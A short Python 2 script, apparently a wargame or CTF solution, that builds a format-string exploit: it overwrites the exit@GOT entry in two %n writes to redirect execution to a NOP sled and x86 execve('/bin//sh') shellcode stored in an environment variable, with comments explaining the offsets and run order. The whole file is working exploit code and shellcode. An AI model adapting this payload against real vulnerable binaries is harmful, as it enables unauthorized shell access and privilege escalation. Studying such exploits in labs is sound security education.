import struct # endianness and interpretation as byte from reg addresses

exit_got_addr = 0x080497e0 # exit@plt jmp
shellcode_addr = 0xffffd800 # Somewhere in the nop-sled

nopslide = "\x90"*512 # Bigger since in env no size restr, easy to spot when fuzzing printf
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

exploit = "" # This works for python 2 not 3, str are treated as byte, scp it first
exploit += struct.pack("I", exit_got_addr) # Split write in two to avoid network big number
exploit += struct.pack("I", exit_got_addr+2) # we will still write 4 but before the got address we dont care the 2 byte we'll overwrite
exploit += "%10$55288x" # 0xd800 = 55296 -8; 8 being the two address above
exploit += "%10$n" # 10 is 0x28, and our buffer start at $esp+0x28, so beginning of this string
exploit += "%11$10239x" # 0xffff = 65535 -55296
exploit += "%11$n  " # 2 space stack alignement prevention, 11$, last 2 byte

# print nopslide + shellcode # Run this first, and export it in SHELLCODE, near the top of the env
print exploit # run this after
